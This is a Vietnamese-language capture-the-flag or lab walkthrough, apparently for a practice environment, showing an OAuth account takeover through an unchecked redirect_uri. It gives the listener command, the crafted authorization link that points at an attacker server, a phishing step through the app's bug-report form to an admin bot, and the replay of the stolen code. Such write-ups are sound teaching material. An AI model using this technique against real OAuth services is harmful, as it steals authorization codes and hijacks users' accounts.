# 🕵️ Hướng Dẫn Khai Thác (Step-by-Step)

Chúng ta sẽ thực hiện cuộc tấn công chiếm quyền tài khoản (Account Takeover) chỉ với **1 lỗ hổng duy nhất**: SocialID không kiểm tra địa chỉ chuyển hướng (Redirect URI).

---

## 🛑 BƯỚC 1: Dựng Server "Nghe Lén" (Attacker Server)
Để cuộc tấn công bớt "trừu tượng", bạn cần tự tay dựng một server để nhìn thấy dữ liệu gửi về.

1.  Mở một cửa sổ Terminal (Console) mới.
2.  Chạy lệnh sau để biến máy bạn thành một Web Server nghe ở cổng `9999`:
    ```bash
    python3 -m http.server 9999
    ```
    *(Màn hình sẽ hiện: `Serving HTTP on 0.0.0.0 port 9999 ...` - Giữ nguyên cửa sổ này)*

---

## 🔍 BƯỚC 2: Tạo Link Độc Hại (Malicious Link)
1.  Truy cập PhotoApp, bấm **Login** -> Bạn sẽ thấy URL trên thanh địa chỉ có dạng:
    ```
    http://192.168.179.149:3000/auth?client_id=photoapp&response_type=code&redirect_uri=http://192.168.179.149:8083/callback.php&scope=profile
    ```
2.  Copy link đó ra Notepad.
3.  Sửa phần `redirect_uri` thành địa chỉ Server Nghe Lén của bạn ở Bước 1.
    *   Sửa: `http://192.168.179.149:8083/callback.php`
    *   Thành: `http://192.168.179.149:9999/callback.php`
    *(Nhớ thay `<HOST>` bằng IP máy Lab của bạn)*

    Link cuối cùng sẽ trông như sau:
    ```
    http://192.168.179.149:3000/auth?client_id=photoapp&response_type=code&redirect_uri=http://192.168.179.149:9999/callback.php&scope=profile
    ```

---

## 🎣 BƯỚC 3: Gửi Link Cho Admin (The Phishing)
1.  Quay lại trang chủ PhotoApp.
2.  Bấm vào nút **"Report Bug"** (hoặc "Contact Admin").
3.  Dán **Link Độc Hại** bạn vừa chế ở Bước 2 vào ô nội dung.
4.  Bấm **Send**.

---

## 🔓 BƯỚC 4: "Bắt" Code và Đăng Nhập
Ngay sau khi Admin (Bot) bấm vào link bạn gửi:

1.  **Quan sát cửa sổ Terminal (Bước 1)**. Bạn sẽ thấy một dòng log mới xuất hiện:
    ```
    172.x.x.x - - [Date] "GET /callback.php?code=AUTH_CODE_XYZ123 HTTP/1.1" 404 -
    ```
2.  **Copy đoạn Code**: `AUTH_CODE_XYZ123` (chuỗi ký tự dài đằng sau `code=`).
3.  **Chiếm quyền**:
    *   Mở trình duyệt của bạn (Tab ẩn danh hoặc Logout trước).
    *   Tự gõ URL callback hợp lệ của PhotoApp, nhưng dán code của Admin vào:
        ```
        http://<HOST>:8083/callback.php?code=AUTH_CODE_XYZ123
        ```
    *   Enter -> **BÙM!** Bạn đã đăng nhập thành công với tên: **Administrator**. -> Lấy Flag.

---

## 🧠 Giải Thích Đơn Giản (Tại sao lại thế?)
1.  **Lẽ ra**: SocialID phải kiểm tra xem `redirect_uri` bạn gửi lên có phải là `http://photoapp.local...` chính chủ không.
2.  **Thực tế**: SocialID "lười", tin luôn cái link bạn gửi (`http://...:9999`).
3.  **Hậu quả**: Thay vì gửi chìa khóa xe (Code) về nhà (PhotoApp), SocialID lại gửi nhầm chìa khóa sang nhà trộm (Server 9999).
